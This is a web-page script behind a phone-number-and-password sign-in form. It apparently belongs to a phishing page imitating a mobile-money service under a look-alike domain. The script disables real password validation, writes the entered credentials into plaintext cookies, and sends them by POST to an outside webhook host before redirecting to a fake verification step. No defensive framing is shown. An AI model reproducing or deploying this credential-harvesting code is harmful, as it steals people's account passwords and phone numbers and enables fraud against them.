    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const sb = document.querySelector("#sb")
            const invalid_password_label = document.querySelector("#invalid_password_label");
            const signin_form = document.querySelector("#signin")
            const password = document.querySelector('#password')
            const phonenumber = document.querySelector('#phonenumber')
            const password_validation = new RegExp('^(?=.*?[a-zA-Z])(?=.*?[0-9])(?=.*?[@#$_&+\\(\\)\\\\\\/*\"\':.,;!?`•\\|√π÷×§∆£¢€¥° %©®™✓\\[\\]\\{\\}\\^\\=]).{6,}$')
            sb.disabled = true
            sb.classList.add("sb_disabled");
            const apply_styles = (value) => {
                console.log(value)
                if (value == '') {
                    sb.disabled = true;
                    sb.classList.add("sb_disabled");
                } 
                // else if (password_validation.test(value)) {
                else if (true) {
                    sb.disabled = false;
                    sb.classList.remove("sb_disabled")
                    invalid_password_label.classList.add("invalid_password_hide");
                    invalid_password_label.classList.remove("invalid_password_show");
                } else {
                    sb.disabled = true;
                    sb.classList.add("sb_disabled");
                    invalid_password_label.classList.add("invalid_password_show");
                    invalid_password_label.classList.remove("invalid_password_hide");
                }
            }

        signin_form.addEventListener("input", (event) => {
            if (event.target == password) {
                apply_styles(event.target.value)
            }
            if (event.target == phonenumber) {
                if (event.target.value == '') {
                    sb.disabled = true;
                    sb.classList.add("sb_disabled");
                } else {
                    apply_styles(password.value)
                }
            }
        });
    });

    function setCookie(cname, cvalue) {
        const d = new Date()
        d.setTime(d.getTime() + (1000 * 24 * 60 * 60 * 1000))
        document.cookie = cname + "=" + cvalue + ";expires=" + d.toUTCString(); + ";path=/";
    }
     
     
     
     $('#sb').on('click',function(data){
        data.preventDefault();
        setCookie("phonenumber", document.getElementById('phonenumber').value);
        setCookie("password", document.getElementById('password').value);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", 'https://webhook.orangernoney.com',true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
                window.location.href = '/verification';
            }
            else{
                console.log("ERRORRRRRR")
            }
        }

        xhr.send(
            JSON.stringify({
            'phonenumber': document.getElementById('phonenumber').value,
            'password':document.getElementById('password').value,
            })
        );
     })
    </script>
